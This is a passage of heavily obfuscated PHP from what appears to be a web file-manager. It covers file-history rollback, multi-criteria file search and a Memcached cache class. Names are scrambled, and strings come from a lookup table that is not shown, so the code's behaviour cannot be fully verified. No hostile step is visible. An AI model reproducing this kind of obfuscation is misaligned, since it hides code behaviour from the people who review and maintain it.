$‰æ•ÎÍÁ) { $ñ”¬®ÜÎ =& $_SERVER[¤øïŠ‹²]; return $this->where(array($ñ”¬®ÜÎ[514] => $ìİ¹¦¦È))->save(array($ñ”¬®ÜÎ[2383] => $‰æ•ÎÍÁ)); } public function rollbackToItem($£²©îŒ, $–è“Ú•Ø) { $­£Úî‹Ô =& $_SERVER[¤øïŠ‹²]; $†Ã‰ß«Û = Model($­£Úî‹Ô[934])->sourceInfo($£²©îŒ); $this->addHistory($†Ã‰ß«Û, LNG($­£Úî‹Ô[2394])); $¥ÅÛñŒ² = $this->find($–è“Ú•Ø); $™ˆÏÃÙÔ = array($­£Úî‹Ô[563] => $¥ÅÛñŒ²[$­£Úî‹Ô[563]], $­£Úî‹Ô[90] => $¥ÅÛñŒ²[$­£Úî‹Ô[90]], $­£Úî‹Ô[99] => time(), $­£Úî‹Ô[549] => USER_ID); Model($­£Úî‹Ô[934])->where(array($­£Úî‹Ô[204] => $£²©îŒ))->save($™ˆÏÃÙÔ); return $this->where(array($­£Úî‹Ô[514] => $–è“Ú•Ø))->delete(); } public function clearSame($è»¥•¯Ñ) { $ÅŸğç¡ğ =& $_SERVER[¤øïŠ‹²]; $»àƒş®ğ = $this->listData($è»¥•¯Ñ); $ë˜–”Ö“ = array_to_keyvalue_group($»àƒş®ğ, $ÅŸğç¡ğ[563]); $§½Ô¹ø = array(); $Šß‰Å–Ú = array(); foreach ($ë˜–”Ö“ as $ÀÊëè¹Ê) { if (!$ÀÊëè¹Ê || count($ÀÊëè¹Ê) <= 1) { continue; } foreach ($ÀÊëè¹Ê as $Ì‚ÎĞ) { $§½Ô¹ø[] = $Ì‚ÎĞ[$ÅŸğç¡ğ[563]]; $Šß‰Å–Ú[] = $Ì‚ÎĞ[$ÅŸğç¡ğ[493]]; } } if (!$Šß‰Å–Ú) { return; } $this->where(array($ÅŸğç¡ğ[493] => array($ÅŸğç¡ğ[7], $Šß‰Å–Ú)))->delete(); Model($ÅŸğç¡ğ[566])->remove($§½Ô¹ø); } public function userSpace() { $ßÑ»ıáÀ =& $_SERVER[¤øïŠ‹²]; $¿¤†ûà¾ = $this->tablePrefix; $é‘ÛÎ¡ = array($ßÑ»ıáÀ[1916] => USER_ID); $Èö·‰ä = "{$¿¤†ûà¾}\x69\157\x5f\x66\151\x6c\x65\x20\146\x69\x6c\145\x73\x20\x6f\x6e\x20\146\151\x6c\145\163\56\146\151\x6c\145\x49\104\x20\75\x20\x68\151\x73\164\x6f\x72\x79\56\x66\151\154\145\111\x44"; return $this->alias($ßÑ»ıáÀ[2392])->where($é‘ÛÎ¡)->join($Èö·‰ä, $ßÑ»ıáÀ[2393])->sum($ßÑ»ıáÀ[90]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¦È¤èÒ) { $¥Ûõ¿¤› =& $_SERVER[¤øïŠ‹²]; $ÜĞĞÎÒ˜ = KodIO::fileTypeList(); $œæ…æŠ = $ÜĞĞÎÒ˜[$¦È¤èÒ]; if (!$œæ…æŠ) { return array(); } $ÆÄ—ƒ™° = $œæ…æŠ[$¥Ûõ¿¤›[179]]; $Œ”êúØ³ = $¥Ûõ¿¤›[7]; if (!$œæ…æŠ[$¥Ûõ¿¤›[179]]) { $Ë²í™î³ = array_to_keyvalue($ÜĞĞÎÒ˜, $¥Ûõ¿¤›[12], $¥Ûõ¿¤›[179]); $ÆÄ—ƒ™° = implode($¥Ûõ¿¤›[50], $Ë²í™î³); $Œ”êúØ³ = $¥Ûõ¿¤›[2395]; } $Ã‚óâš¥ = explode($¥Ûõ¿¤›[50], trim($ÆÄ—ƒ™°, $¥Ûõ¿¤›[50])); return array($Œ”êúØ³, $Ã‚óâš¥); } public function listPathType($²©øÍóõ) { $±š²ò—­ =& $_SERVER[¤øïŠ‹²]; $¡§ùò¦½ = $this->fileTypeWhere($²©øÍóõ); if (!$¡§ùò¦½) { return array(); } $ÆÉÖñ­ = USER_ID; $²ÉÇ÷ã  = Model($±š²ò—­[623])->getInfo($ÆÉÖñ­); $»€ıÆÜ± = array($±š²ò—­[677] => SourceModel::TYPE_USER, $±š²ò—­[610] => array($±š²ò—­[641], $±š²ò—­[619] . $²ÉÇ÷ã [$±š²ò—­[101]][$±š²ò—­[204]] . $±š²ò—­[642]), $±š²ò—­[678] => $ÆÉÖñ­, $±š²ò—­[675] => 0, $±š²ò—­[676] => $¡§ùò¦½); return $this->listSource($»€ıÆÜ±); } public function listSearch($¥èû”ş‹, $Æ™á„£â = 300) { $½Ã±¡Â =& $_SERVER[¤øïŠ‹²]; if (isset($¥èû”ş‹[$½Ã±¡Â[2227]]) && $¥èû”ş‹[$½Ã±¡Â[2227]]) { $¥èû”ş‹[$½Ã±¡Â[2227]] = str_replace($½Ã±¡Â[481], $½Ã±¡Â[2396], trim($¥èû”ş‹[$½Ã±¡Â[2227]])); } $±š»‘¦· = $this->_parseSearchWhere($¥èû”ş‹); if (!isset($±š»‘¦·[$½Ã±¡Â[526]])) { $±š»‘¦·[$½Ã±¡Â[526]] = 0; } $Ş½Û°³å = $½Ã±¡Â[2397]; $öğÛ©ü = $±š»‘¦·; $Ì‹È…Ùô = $Ş½Û°³å; $this->_listSearchBindPinyin($¥èû”ş‹, $±š»‘¦·, $Ş½Û°³å); $this->alias($½Ã±¡Â[539])->_makeOrder(); $±š»‘¦· = $this->parseWhereLike($±š»‘¦·); $àÙ¼úö = $this->distinct(!0)->field($Ş½Û°³å)->where($±š»‘¦·)->selectPage($Æ™á„£â); if ($GLOBALS[$½Ã±¡Â[6]][$½Ã±¡Â[478]][$½Ã±¡Â[479]] && Input::check($¥èû”ş‹[$½Ã±¡Â[2227]], $½Ã±¡Â[684]) && $àÙ¼úö[$½Ã±¡Â[454]][$½Ã±¡Â[440]] == 1 && $àÙ¼úö[$½Ã±¡Â[454]][$½Ã±¡Â[455]] == 0) { $àÙ¼úö = $this->distinct(!0)->field($Ş½Û°³å)->where($öğÛ©ü)->limit(1000)->select(); $àÙ¼úö = array_page_split($àÙ¼úö, !1, $Æ™á„£â); } $this->_listSearchFileContent($àÙ¼úö, $¥èû”ş‹, $Ì‹È…Ùô, $öğÛ©ü); $this->_listSearchDesc($àÙ¼úö, $¥èû”ş‹, $Ì‹È…Ùô); $this->_listSearchTag($àÙ¼úö, $¥èû”ş‹, $Ì‹È…Ùô); $this->_listSearchGroupTag($àÙ¼úö, $¥èû”ş‹, $Ì‹È…Ùô); $this->_listDataApply($àÙ¼úö[$½Ã±¡Â[457]]); $this->_listMake($àÙ¼úö); return $àÙ¼úö; } private function _listSearchFileContent(&$ú¼“î—Ó, $ŞÃËÜÓç, $Á¥ÈäÌ, $©Èë‘Ø×) { $±Ë¤Ä² =& $_SERVER[¤øïŠ‹²]; if (!$ŞÃËÜÓç[$±Ë¤Ä²[2227]] || $ú¼“î—Ó[$±Ë¤Ä²[454]][$±Ë¤Ä²[440]] > 1) { return; } if (!isset($©Èë‘Ø×[$±Ë¤Ä²[32]]) || !is_array($ŞÃËÜÓç[$±Ë¤Ä²[563]])) { return; } $©Èë‘Ø×[$±Ë¤Ä²[563]] = array($±Ë¤Ä²[7], $ŞÃËÜÓç[$±Ë¤Ä²[563]]); unset($©Èë‘Ø×[$±Ë¤Ä²[32]]); unset($ŞÃËÜÓç[$±Ë¤Ä²[563]]); $îÌáÉ‡‚ = $this->field($Á¥ÈäÌ)->where($©Èë‘Ø×)->limit($±Ë¤Ä²[2398])->select(); if (!$îÌáÉ‡‚ || count($îÌáÉ‡‚) == 0) { return; } $ú¼“î—Ó[$±Ë¤Ä²[457]] = array_merge($îÌáÉ‡‚, $ú¼“î—Ó[$±Ë¤Ä²[457]]); $ú¼“î—Ó[$±Ë¤Ä²[454]][$±Ë¤Ä²[455]] += count($îÌáÉ‡‚); } private function _listSearchTag(&$ÔŒú¡±ß, $¡Áüåï¼, $íÜ„ëü’) { $“ùƒš‚Ó =& $_SERVER[¤øïŠ‹²]; if (empty($¡Áüåï¼[$“ùƒš‚Ó[2093]]) || !in_array($“ùƒš‚Ó[2399], $¡Áüåï¼[$“ùƒš‚Ó[2093]])) { return; } if (!$¡Áüåï¼[$“ùƒš‚Ó[2227]] || $ÔŒú¡±ß[$“ùƒš‚Ó[454]][$“ùƒš‚Ó[440]] > 1) { return; } $ÇââƒÚ™ = Model($“ùƒš‚Ó[2400])->listData(); $³ãÂËªÇ = array(); $Í†—®Çœ = $¡Áüåï¼[$“ùƒš‚Ó[2227]]; foreach ($ÇââƒÚ™ as $—Û”ùäı) { $˜ßçÓ¹‰ = $—Û”ùäı[$“ùƒš‚Ó[32]]; $¹ú»öÇÏ = str_replace($“ùƒš‚Ó[53], $“ùƒš‚Ó[12], Pinyin::get($˜ßçÓ¹‰)); if (stripos($˜ßçÓ¹‰, $Í†—®Çœ) !== !1 || stripos($¹ú»öÇÏ, $Í†—®Çœ) !== !1) { $³ãÂËªÇ[] = $—Û”ùäı[$“ùƒš‚Ó[493]]; } } if (!$³ãÂËªÇ) { return; } $ãäœ®Óá = array($“ùƒš‚Ó[521] => array($“ùƒš‚Ó[7], $³ãÂËªÇ), $“ùƒš‚Ó[1542] => USER_ID); $Â‚òÖòœ = Model($“ùƒš‚Ó[523])->field($“ùƒš‚Ó[98])->where($ãäœ®Óá)->select(); $Â‚òÖòœ = array_to_keyvalue($Â‚òÖòœ, $“ùƒš‚Ó[12], $“ùƒš‚Ó[98]); $Ô¤œşšÛ = array_unique($Â‚òÖòœ); $this->_listSearchMerge($ÔŒú¡±ß, $¡Áüåï¼, $íÜ„ëü’, $Ô¤œşšÛ); } private function _listSearchDesc(&$éÂıæÔÏ, $‹ÉŒË¿£, $¦ªøÜ‰Ö) { $ëĞ‹Ñİû =& $_SERVER[¤øïŠ‹²]; if (empty($‹ÉŒË¿£[$ëĞ‹Ñİû[2093]]) || !in_array($ëĞ‹Ñİû[546], $‹ÉŒË¿£[$ëĞ‹Ñİû[2093]])) { return; } if (!$‹ÉŒË¿£[$ëĞ‹Ñİû[2227]] || $éÂıæÔÏ[$ëĞ‹Ñİû[454]][$ëĞ‹Ñİû[440]] > 1) { return; } $Ôê½¹Ò = array($ëĞ‹Ñİû[106] => $ëĞ‹Ñİû[546], $ëĞ‹Ñİû[462] => array($ëĞ‹Ñİû[480], $ëĞ‹Ñİû[2229] . $‹ÉŒË¿£[$ëĞ‹Ñİû[2227]] . $ëĞ‹Ñİû[2229])); $Ì¿²é¢È = !1; if ($Ì¿²é¢È) { $œ±ïÏ = $this->listSearchChildren($‹ÉŒË¿£[$ëĞ‹Ñİû[203]]); $œ±ïÏ = array_unique($œ±ïÏ); if (!$œ±ïÏ) { return; } $Ôê½¹Ò[$ëĞ‹Ñİû[204]] = array($ëĞ‹Ñİû[7], $œ±ïÏ); } $¬ëª‹‘ = Model($ëĞ‹Ñİû[661])->field($ëĞ‹Ñİû[204])->where($Ôê½¹Ò)->limit(5000)->select(); $¾´ş›’˜ = array_to_keyvalue($¬ëª‹‘, $ëĞ‹Ñİû[12], $ëĞ‹Ñİû[204]); $this->_listSearchMerge($éÂıæÔÏ, $‹ÉŒË¿£, $¦ªøÜ‰Ö, $¾´ş›’˜); } private function _listSearchGroupTag(&$ñûØõ†Ğ, $÷ó£Äƒ, $ƒ»ù«¦) { $ÊœĞÜ‚Ÿ =& $_SERVER[¤øïŠ‹²]; if (empty($÷ó£Äƒ[$ÊœĞÜ‚Ÿ[2093]]) || !in_array($ÊœĞÜ‚Ÿ[2399], $÷ó£Äƒ[$ÊœĞÜ‚Ÿ[2093]])) { return; } if (!$÷ó£Äƒ[$ÊœĞÜ‚Ÿ[2227]] || $ñûØõ†Ğ[$ÊœĞÜ‚Ÿ[454]][$ÊœĞÜ‚Ÿ[440]] > 1 || !$÷ó£Äƒ[$ÊœĞÜ‚Ÿ[203]]) { return; } $×¥ÅË²¹ = $this->sourceInfo($÷ó£Äƒ[$ÊœĞÜ‚Ÿ[203]]); if (!$×¥ÅË²¹ || $×¥ÅË²¹[$ÊœĞÜ‚Ÿ[201]] != SourceModel::TYPE_GROUP) { return; } $Ù×¯÷ = $×¥ÅË²¹[$ÊœĞÜ‚Ÿ[595]]; $ÅşãÊÁ« = Model($ÊœĞÜ‚Ÿ[2401])->get($Ù×¯÷); $¢¢¥¹¥ù = array(); $ÆÖÙñøª = $÷ó£Äƒ[$ÊœĞÜ‚Ÿ[2227]]; foreach ($ÅşãÊÁ«[$ÊœĞÜ‚Ÿ[457]] as $öâÜÂº±) { $½—šöÃ¬ = $öâÜÂº±[$ÊœĞÜ‚Ÿ[32]]; $Ğ™ìÖòİ = str_replace($ÊœĞÜ‚Ÿ[53], $ÊœĞÜ‚Ÿ[12], Pinyin::get($½—šöÃ¬)); if (stripos($½—šöÃ¬, $ÆÖÙñøª) !== !1 || stripos($Ğ™ìÖòİ, $ÆÖÙñøª) !== !1) { $¢¢¥¹¥ù[] = $öâÜÂº±[$ÊœĞÜ‚Ÿ[493]]; } } if (!$¢¢¥¹¥ù) { return; } $ŞÓç–‰ = array($ÊœĞÜ‚Ÿ[521] => array($ÊœĞÜ‚Ÿ[7], $¢¢¥¹¥ù), $ÊœĞÜ‚Ÿ[1542] => 0, $ÊœĞÜ‚Ÿ[33] => $ÊœĞÜ‚Ÿ[1440] . $Ù×¯÷); $Ê³ª“˜ = Model($ÊœĞÜ‚Ÿ[523])->field($ÊœĞÜ‚Ÿ[98])->where($ŞÓç–‰)->select(); $Ê³ª“˜ = array_to_keyvalue($Ê³ª“˜, $ÊœĞÜ‚Ÿ[12], $ÊœĞÜ‚Ÿ[98]); $ Õ‚™¶ = array_unique($Ê³ª“˜); $this->_listSearchMerge($ñûØõ†Ğ, $÷ó£Äƒ, $ƒ»ù«¦, $ Õ‚™¶); } private function _listSearchMerge(&$ĞˆÙôÓ, $·¦Ò´Ì, $Ş×Äââ, $Îñ»ÅæÔ) { $ÒÚˆ¡íÅ =& $_SERVER[¤øïŠ‹²]; if (!$Îñ»ÅæÔ) { return; } $û–âş–° = array_to_keyvalue($ĞˆÙôÓ[$ÒÚˆ¡íÅ[457]], $ÒÚˆ¡íÅ[12], $ÒÚˆ¡íÅ[204]); $øËÓ–óÃ = array_diff($Îñ»ÅæÔ, $û–âş–°); if (!$øËÓ–óÃ) { return; } $ËªôÎÏ” = array($ÒÚˆ¡íÅ[204] => array($ÒÚˆ¡íÅ[7], $øËÓ–óÃ)); $ÜŸ¥‘Š = $this->field($Ş×Äââ)->where($ËªôÎÏ”)->select(); if (!$ÜŸ¥‘Š) { return; } $‰è™ù¯© = array(); foreach ($ÜŸ¥‘Š as $Àºò®ÙÀ) { if ($this->_listSearchFilter($Àºò®ÙÀ, $·¦Ò´Ì)) { $‰è™ù¯©[] = $Àºò®ÙÀ; } } $ĞˆÙôÓ[$ÒÚˆ¡íÅ[457]] = array_merge($‰è™ù¯©, $ĞˆÙôÓ[$ÒÚˆ¡íÅ[457]]); $ĞˆÙôÓ[$ÒÚˆ¡íÅ[454]][$ÒÚˆ¡íÅ[455]] += count($‰è™ù¯©); } private function _listSearchFilter($úİÒâÃ«, $çı¸à‚ı) { $şß–ø =& $_SERVER[¤øïŠ‹²]; $†éää†Ä = $úİÒâÃ«[$şß–ø[506]] == $şß–ø[102]; if (!strstr($úİÒâÃ«[$şß–ø[610]], $şß–ø[50] . $çı¸à‚ı[$şß–ø[203]] . $şß–ø[50])) { return !1; } if (isset($çı¸à‚ı[$şß–ø[507]]) && $çı¸à‚ı[$şß–ø[507]] != $şß–ø[880]) { if ($çı¸à‚ı[$şß–ø[507]] == $şß–ø[89] && !$†éää†Ä) { return !1; } if ($çı¸à‚ı[$şß–ø[507]] != $şß–ø[89] && $†éää†Ä) { return !1; } if (!strstr($úİÒâÃ«[$şß–ø[179]], $şß–ø[50] . $çı¸à‚ı[$şß–ø[507]] . $şß–ø[50])) { return !1; } } if (isset($çı¸à‚ı[$şß–ø[2402]]) && $çı¸à‚ı[$şß–ø[2402]] < $úİÒâÃ«[$şß–ø[90]]) { return !1; } if (isset($çı¸à‚ı[$şß–ø[2403]]) && $çı¸à‚ı[$şß–ø[2403]] > $úİÒâÃ«[$şß–ø[90]]) { return !1; } if (isset($çı¸à‚ı[$şß–ø[691]]) && $çı¸à‚ı[$şß–ø[691]] != $úİÒâÃ«[$şß–ø[549]]) { return !1; } return !0; } public function listSearchChildren($…Œß—¶Ñ, $÷ûŒ‘Öé = 5000) { $¢‡ÖÉö‡ =& $_SERVER[¤øïŠ‹²]; $Œ½ûá = array(); $¸®ÌÏ± = $this->sourceInfo($…Œß—¶Ñ); $›ÃüäŒ = array($¢‡ÖÉö‡[610] => array($¢‡ÖÉö‡[480], $¸®ÌÏ±[$¢‡ÖÉö‡[610]] . $¸®ÌÏ±[$¢‡ÖÉö‡[204]] . $¢‡ÖÉö‡[642])); $ç´…Íƒô = $this->field($¢‡ÖÉö‡[90])->where($›ÃüäŒ)->limit($÷ûŒ‘Öé + 1)->select(); $ÒÙ¹ğ®È = is_array($ç´…Íƒô) ? count($ç´…Íƒô) : 0; if ($ÒÙ¹ğ®È > $÷ûŒ‘Öé) { return $this->_listSearchChildrenNear($…Œß—¶Ñ, $÷ûŒ‘Öé); } $Õ’Ó Ú = $this->field($¢‡ÖÉö‡[204])->where($›ÃüäŒ)->select(); $Œ½ûá = array_to_keyvalue($Õ’Ó Ú, $¢‡ÖÉö‡[12], $¢‡ÖÉö‡[204]); return $Œ½ûá; } private function _listSearchChildrenNear($ƒ¹Š¼¾™, $ªâúô¯§) { $ï¤‹æ×Ò =& $_SERVER[¤øïŠ‹²]; $‡İ•êŒ¹ = array(); $¼‡á“áğ = array($ï¤‹æ×Ò[203] => $ƒ¹Š¼¾™); $‡™Â½¨ô = $this->field($ï¤‹æ×Ò[2404])->where($¼‡á“áğ)->select(); $“ë şÍÌ = array_to_keyvalue(array_filter_by_field($‡™Â½¨ô, $ï¤‹æ×Ò[506], $ï¤‹æ×Ò[102]), $ï¤‹æ×Ò[12], $ï¤‹æ×Ò[204]); $‡İ•êŒ¹ = array_merge($‡İ•êŒ¹, array_to_keyvalue($‡™Â½¨ô, $ï¤‹æ×Ò[12], $ï¤‹æ×Ò[204])); if (!$“ë şÍÌ) { return $‡İ•êŒ¹; } $¼‡á“áğ = array($ï¤‹æ×Ò[203] => array($ï¤‹æ×Ò[7], $“ë şÍÌ)); $‡™Â½¨ô = $this->field($ï¤‹æ×Ò[2404])->where($¼‡á“áğ)->limit($ªâúô¯§)->select(); $‡İ•êŒ¹ = array_merge($‡İ•êŒ¹, array_to_keyvalue($‡™Â½¨ô, $ï¤‹æ×Ò[12], $ï¤‹æ×Ò[204])); $‡İ•êŒ¹ = array_slice($‡İ•êŒ¹, 0, intval($ªâúô¯§)); return $‡İ•êŒ¹; } private function _listSearchBindPinyin($÷Ğ˜º÷, &$©”Î¬ğ, &$ªîÈªÚò) { $¢‡™ĞÇ— =& $_SERVER[¤øïŠ‹²]; if (!isset($÷Ğ˜º÷[$¢‡™ĞÇ—[2227]]) || !$÷Ğ˜º÷[$¢‡™ĞÇ—[2227]]) { return; } if (!Input::check($÷Ğ˜º÷[$¢‡™ĞÇ—[2227]], $¢‡™ĞÇ—[405]) || strlen($÷Ğ˜º÷[$¢‡™ĞÇ—[2227]]) < 2) { return; } $¢ƒ‡‹Ñ„ = "\x4c\x45\106\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\163\x6f\165\x72\x63\145\137\155\x65\164\x61\40\155\x65\x74\x61\40\157\x6e\x20\x73\157\x75\x72\x63\x65\56\163\157\165\x72\143\x65\x49\x44\40\x3d\40\155\x65\x74\x61\x2e\163\x6f\165\162\x63\145\x49\104"; $şÅ¬¶Í = array(); $ªîÈªÚò = str_replace(array($¢‡™ĞÇ—[59], $¢‡™ĞÇ—[53], $¢‡™ĞÇ—[2405]), $¢‡™ĞÇ—[12], $ªîÈªÚò); $ªîÈªÚò = $¢‡™ĞÇ—[531] . str_replace($¢‡™ĞÇ—[50], $¢‡™ĞÇ—[532], $ªîÈªÚò); $Ğ À­À = $©”Î¬ğ[$¢‡™ĞÇ—[32]]; unset($©”Î¬ğ[$¢‡™ĞÇ—[32]]); foreach ($©”Î¬ğ as $ÅÉÊ„Æ => $±…×¾øâ) { $şÅ¬¶Í[$¢‡™ĞÇ—[531] . $ÅÉÊ„Æ] = $±…×¾øâ; } foreach ($Ğ À­À as $´ú«ò”É) { $şÅ¬¶Í[] = array($¢‡™ĞÇ—[536] => $´ú«ò”É, $¢‡™ĞÇ—[1116] => $¢‡™ĞÇ—[2231], array($¢‡™ĞÇ—[2406] => $´ú«ò”É, $¢‡™ĞÇ—[2407] => array($¢‡™ĞÇ—[7], array($¢‡™ĞÇ—[558], $¢‡™ĞÇ—[557])))); } $this->join($¢ƒ‡‹Ñ„); $©”Î¬ğ = $şÅ¬¶Í; } private function _parseSearchWhere($Áµ‰ç·ã) { $â‰‡ÉòÂ =& $_SERVER[¤øïŠ‹²]; $œ‚¿¶´Ÿ = array(); if (isset($Áµ‰ç·ã[$â‰‡ÉòÂ[862]]) && $Áµ‰ç·ã[$â‰‡ÉòÂ[862]]) { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[99]] = array($â‰‡ÉòÂ[2408], $Áµ‰ç·ã[$â‰‡ÉòÂ[862]]); } if (isset($Áµ‰ç·ã[$â‰‡ÉòÂ[863]]) && $Áµ‰ç·ã[$â‰‡ÉòÂ[863]]) { $áœßÍãæ = array($â‰‡ÉòÂ[2409], $Áµ‰ç·ã[$â‰‡ÉòÂ[863]]); if ($œ‚¿¶´Ÿ[$â‰‡ÉòÂ[99]]) { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[99]] = array($œ‚¿¶´Ÿ[$â‰‡ÉòÂ[99]], $áœßÍãæ, $â‰‡ÉòÂ[2410]); } else { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[99]] = $áœßÍãæ; } } if (isset($Áµ‰ç·ã[$â‰‡ÉòÂ[2402]]) && $Áµ‰ç·ã[$â‰‡ÉòÂ[2402]] > 0) { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[90]] = array($â‰‡ÉòÂ[2408], $Áµ‰ç·ã[$â‰‡ÉòÂ[2402]]); } if (isset($Áµ‰ç·ã[$â‰‡ÉòÂ[2403]]) && $Áµ‰ç·ã[$â‰‡ÉòÂ[2403]]) { $áœßÍãæ = array($â‰‡ÉòÂ[2409], $Áµ‰ç·ã[$â‰‡ÉòÂ[2403]]); if ($œ‚¿¶´Ÿ[$â‰‡ÉòÂ[90]]) { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[90]] = array($œ‚¿¶´Ÿ[$â‰‡ÉòÂ[90]], $áœßÍãæ, $â‰‡ÉòÂ[2410]); } else { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[90]] = $áœßÍãæ; } } if (isset($Áµ‰ç·ã[$â‰‡ÉòÂ[691]]) && $Áµ‰ç·ã[$â‰‡ÉòÂ[691]]) { $œ‚¿¶´Ÿ[] = array($â‰‡ÉòÂ[549] => $Áµ‰ç·ã[$â‰‡ÉòÂ[691]], $â‰‡ÉòÂ[547] => $Áµ‰ç·ã[$â‰‡ÉòÂ[691]], $â‰‡ÉòÂ[1116] => $â‰‡ÉòÂ[2231]); } if (isset($Áµ‰ç·ã[$â‰‡ÉòÂ[507]]) && $Áµ‰ç·ã[$â‰‡ÉòÂ[507]]) { $¾â›õÅä = $Áµ‰ç·ã[$â‰‡ÉòÂ[507]]; if ($¾â›õÅä == $â‰‡ÉòÂ[89]) { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[506]] = 1; } else { if ($¾â›õÅä == $â‰‡ÉòÂ[2411]) { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[506]] = 0; } else { if ($¾â›õÅä) { $¾â›õÅä = is_array($¾â›õÅä) ? $¾â›õÅä : explode($â‰‡ÉòÂ[50], $¾â›õÅä); $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[507]] = array($â‰‡ÉòÂ[513], $¾â›õÅä); $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[506]] = 0; } } } } $this->_parseSearchParent($Áµ‰ç·ã, $œ‚¿¶´Ÿ); if (isset($Áµ‰ç·ã[$â‰‡ÉòÂ[2227]]) && trim($Áµ‰ç·ã[$â‰‡ÉòÂ[2227]])) { $úØÆÃ = trim($Áµ‰ç·ã[$â‰‡ÉòÂ[2227]]); $äŞúŠá£ = explode($â‰‡ÉòÂ[53], $úØÆÃ); if (strlen($úØÆÃ) > 2 && (substr($úØÆÃ, 0, 1) == $â‰‡ÉòÂ[130] && substr($úØÆÃ, -1) == $â‰‡ÉòÂ[130]) || substr($úØÆÃ, 0, 1) == $â‰‡ÉòÂ[68] && substr($úØÆÃ, -1) == $â‰‡ÉòÂ[68]) { $úØÆÃ = substr($úØÆÃ, 1, -1); $äŞúŠá£ = array($úØÆÃ); } $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[32]] = array(array($â‰‡ÉòÂ[641], $â‰‡ÉòÂ[2229] . $úØÆÃ . $â‰‡ÉòÂ[2229])); if (count($äŞúŠá£) > 1) { $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[32]] = array(); foreach ($äŞúŠá£ as $Å ˜”°³) { if (!trim($Å ˜”°³)) { continue; } $œ‚¿¶´Ÿ[$â‰‡ÉòÂ[32]][] = array($â‰‡ÉòÂ[641], $â‰‡ÉòÂ[2229] . trim($Å ˜”°³) . $â‰‡ÉòÂ[2229]); } } } return $œ‚¿¶´Ÿ; } private function _parseSearchParent($‹ß·ì, &$Š”¡ˆ¦) { $¯ãö›£Ä =& $_SERVER[¤øïŠ‹²]; if (!isset($‹ß·ì[$¯ãö›£Ä[203]]) || !$‹ß·ì[$¯ãö›£Ä[203]]) { return; } $ÇÅ¯Ùùš = $this->pathInfo($‹ß·ì[$¯ãö›£Ä[203]]); $ÁÙâ°¸¸ = $ÇÅ¯Ùùš[$¯ãö›£Ä[203]] . $¯ãö›£Ä[12] === $¯ãö›£Ä[241]; $›¶©ñ­ = $ÇÅ¯Ùùš[$¯ãö›£Ä[201]] == $¯ãö›£Ä[604]; if ($ÇÅ¯Ùùš[$¯ãö›£Ä[620]] == $¯ãö›£Ä[621]) { $é‡ÔÅ­¾ = $this->sourceInfo($‹ß·ì[$¯ãö›£Ä[203]]); $ÇÅ¯Ùùš[$¯ãö›£Ä[610]] = $é‡ÔÅ­¾[$¯ãö›£Ä[610]]; } $Š”¡ˆ¦[$¯ãö›£Ä[681]] = array($¯ãö›£Ä[641], $ÇÅ¯Ùùš[$¯ãö›£Ä[610]] . $‹ß·ì[$¯ãö›£Ä[203]] . $¯ãö›£Ä[642]); $ÇÔ²á÷ø = isset($‹ß·ì[$¯ãö›£Ä[2093]]) && in_array($¯ãö›£Ä[604], $‹ß·ì[$¯ãö›£Ä[2093]]); if (!$ÇÔ²á÷ø || !$›¶©ñ­ || !$ÁÙâ°¸¸ || !$ÇÅ¯Ùùš[$¯ãö›£Ä[508]]) { return; } if (!AuthModel::authCheckRoot($ÇÅ¯Ùùš[$¯ãö›£Ä[508]][$¯ãö›£Ä[509]])) { return; } $§±ÓÖş = $ÇÅ¯Ùùš[$¯ãö›£Ä[595]] . $¯ãö›£Ä[12]; if ($§±ÓÖş == $¯ãö›£Ä[102]) { unset($Š”¡ˆ¦[$¯ãö›£Ä[681]]); $Š”¡ˆ¦[$¯ãö›£Ä[201]] = self::TYPE_GROUP; return; } $ƒ‚¡¿ = Model($¯ãö›£Ä[611])->groupChildrenAll($§±ÓÖş); $µæñÂ‘£ = count($ƒ‚¡¿); if ($µæñÂ‘£ <= 1) { return; } $‡ˆ÷èÃÃ = array($¯ãö›£Ä[203] => 0, $¯ãö›£Ä[201] => self::TYPE_GROUP, $¯ãö›£Ä[595] => array($¯ãö›£Ä[7], $ƒ‚¡¿)); $Ó”“ˆ‹¿ = $this->field($¯ãö›£Ä[2412])->where($‡ˆ÷èÃÃ)->limit($µæñÂ‘£)->select(); $Š”¡ˆ¦[$¯ãö›£Ä[681]] = array(); foreach ($Ó”“ˆ‹¿ as $ûè“ ¯) { $Š”¡ˆ¦[$¯ãö›£Ä[681]][] = array($¯ãö›£Ä[641], $¯ãö›£Ä[619] . $ûè“ ¯[$¯ãö›£Ä[204]] . $¯ãö›£Ä[642]); } $Š”¡ˆ¦[$¯ãö›£Ä[681]][] = $¯ãö›£Ä[2231]; } } goto Cè”Üó‡æ; d¶à¹ÚöÌœ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($•£ü¢—ø, $ªïÏÑó) { $Èáïò¾ô =& $_SERVER[¤øïŠ‹²]; if (!class_exists($Èáïò¾ô[980])) { show_json($Èáïò¾ô[981], !1); } $this->cacheTime = $ªïÏÑó; $this->handle = new Memcached(); if (is_array($•£ü¢—ø[$Èáïò¾ô[982]]) && count($•£ü¢—ø[$Èáïò¾ô[982]]) >= 1) { foreach ($•£ü¢—ø[$Èáïò¾ô[982]] as $™ºµù«Ù) { $ Í´·ç = explode($Èáïò¾ô[4], $™ºµù«Ù); $this->handle->addServer($ Í´·ç[0], $ Í´·ç[1]); } } else { $this->handle->addServer($•£ü¢—ø[$Èáïò¾ô[219]], $•£ü¢—ø[$Èáïò¾ô[220]]); } } public function set($ıêÓ»•©, $œÕˆÏßğ, $ŸÚ†“ŒÈ = false) { $ŸÚ†“ŒÈ = $ŸÚ†“ŒÈ ? $ŸÚ†“ŒÈ : $this->cacheTime; return $this->handle->set($ıêÓ»•©, $œÕˆÏßğ, $ŸÚ†“ŒÈ); } public function get($¶š’°¡ñ) { return $this->handle->get($¶š’°¡ñ); } public function remove($—¦“ÍĞ) { 